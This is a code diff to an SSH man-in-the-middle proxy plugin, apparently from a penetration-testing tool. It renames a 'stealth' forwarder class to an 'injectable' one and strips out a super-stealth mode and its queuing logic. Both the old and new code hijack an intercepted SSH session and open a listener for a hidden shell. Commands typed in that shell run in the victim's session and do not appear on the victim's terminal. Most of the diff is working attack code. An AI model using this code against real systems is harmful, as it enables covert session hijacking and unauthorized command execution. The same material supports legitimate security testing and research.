@@ -11,8 +11,8 @@ from ssh_proxy_server.forwarders.ssh import SSHForwarder
 from ssh_proxy_server.plugins.ssh.mirrorshell import InjectServer
 
 
-class SSHStealthForwarder(SSHForwarder):
-    """injectorshell that focuses on stealth operation
+class SSHInjectableForwarder(SSHForwarder):
+    """hijack a ssh session and execute commands on an individual shell
     """
 
     HOST_KEY_LENGTH = 2048
@@ -35,24 +35,16 @@ class SSHStealthForwarder(SSHForwarder):
             '--ssh-injectshell-key',
             dest='ssh_injectshell_key'
         )
-        cls.parser().add_argument(
-            '--ssh-injector-super-stealth',
-            dest='ssh_injector_super_stealth',
-            action='store_true',
-            help='enables stealth injector operation (best used with session mirror)'
-        )
 
     def __init__(self, session):
-        super(SSHStealthForwarder, self).__init__(session)
+        super(SSHInjectableForwarder, self).__init__(session)
         self.injector_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.injector_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.injector_sock.bind((self.args.ssh_injector_net, 0))
         self.injector_sock.listen(5)
 
         self.mirror_enabled = self.args.ssh_injector_enable_mirror
-        self.queue = queue.PriorityQueue()
-        self.clear_signal = None
-        self.clear = True
+        self.queue = queue.Queue()
         self.sender = self.session.ssh_channel
         self.injector_shells = []
         thread = threading.Thread(target=self.injector_connect)
@@ -62,7 +54,7 @@ class SSHStealthForwarder(SSHForwarder):
     def injector_connect(self):
         inject_host, inject_port = self.injector_sock.getsockname()
         logging.info(
-            "created stealth shell on port {port}. connect with: ssh -p {port} {host}".format(
+            "created injector shell on port {port}. connect with: ssh -p {port} {host}".format(
                 host=inject_host,
                 port=inject_port
             )
@@ -91,7 +83,7 @@ class SSHStealthForwarder(SSHForwarder):
                     injector_channel = None
                     while not injector_channel:
                         injector_channel = t.accept(0.5)
-                    injector_shell = StealthShell(addr, injector_channel, self)
+                    injector_shell = InjectorShell(addr, injector_channel, self)
                     injector_shell.start()
                     self.injector_shells.append(injector_shell)
                 time.sleep(0.1)
@@ -102,23 +94,12 @@ class SSHStealthForwarder(SSHForwarder):
 
     def forward_stdin(self):
         if self.session.ssh_channel.recv_ready():
-            self.clear = False
             buf = self.session.ssh_channel.recv(self.BUF_LEN)
-            logging.debug("Client:" + str(buf))
-            self.queue.put((0, buf, self.session.ssh_channel))
+            self.queue.put((buf, self.session.ssh_channel))
 
     def forward_stdout(self):
         if self.server_channel.recv_ready():
             buf = self.server_channel.recv(self.BUF_LEN)
-            if self.sender == 'clear_signal':
-                self.clear_signal = buf.strip()
-                self.sender = self.session.ssh_channel
-                return
-            if self.clear_signal:
-                if self.clear_signal in buf:
-                    self.clear = True
-            logging.debug("Server:" + str(buf))
-            logging.debug(self.clear)
             self.sender.sendall(buf)
             if self.mirror_enabled and self.sender == self.session.ssh_channel:
                 for shell in self.injector_shells:
@@ -127,14 +108,7 @@ class SSHStealthForwarder(SSHForwarder):
 
     def forward_extra(self):
         if not self.server_channel.recv_ready() and not self.session.ssh_channel.recv_ready() and not self.queue.empty():
-            if not self.clear_signal:
-                self.server_channel.sendall(b'\r')
-                self.sender = 'clear_signal'
-                return
-            prio, msg, sender = self.queue.get()
-            if sender is not self.session.ssh_channel and not self.clear:
-                self.queue.put((prio, msg, sender))
-                return
+            msg, sender = self.queue.get()
             self.server_channel.sendall(msg)
             self.sender = sender
             self.queue.task_done()
@@ -147,24 +121,22 @@ class SSHStealthForwarder(SSHForwarder):
         self.injector_sock.close()
 
 
-class StealthShell(threading.Thread):
+class InjectorShell(threading.Thread):
 
     BUF_LEN = 1024
     STEALTH_WARNING = """
 [INFO]\r
-This is a stealth shell injected into the secure session the original host created.\r
+This is a hidden shell injected into the secure session the original host created.\r
 Any commands issued CAN affect the environment of the user BUT will not be displayed on their terminal!\r
-Commands from the injected shell will only be executed if they do not interfere with normal operation of the original host!\r
 Exit the hidden shell with CTRL+C\r
 """
 
     def __init__(self, remote, client_channel, forwarder):
-        super(StealthShell, self).__init__()
+        super(InjectorShell, self).__init__()
         self.remote = remote
         self.forwarder = forwarder
         self.queue = self.forwarder.queue
         self.client_channel = client_channel
-        self.command = b''
 
     def run(self) -> None:
         self.client_channel.sendall(self.STEALTH_WARNING)
@@ -172,18 +144,9 @@ Exit the hidden shell with CTRL+C\r
             while not self.forwarder.session.ssh_channel.closed:
                 if self.client_channel.recv_ready():
                     data = self.client_channel.recv(self.forwarder.BUF_LEN)
-                    self.command += data
                     if data == b'\x03':
                         break
-                    if self.forwarder.args.ssh_injector_super_stealth:
-                        if data == b'\r':
-                            self.queue.put((1, self.command, self.client_channel))
-                            self.command = b''
-                        self.client_channel.sendall(data)
-                    else:
-                        self.queue.put((1, self.command, self.client_channel))
-                        self.command = b''
-
+                    self.queue.put((data, self.client_channel))
                 if self.client_channel.exit_status_ready():
                     break
                 time.sleep(0.1)
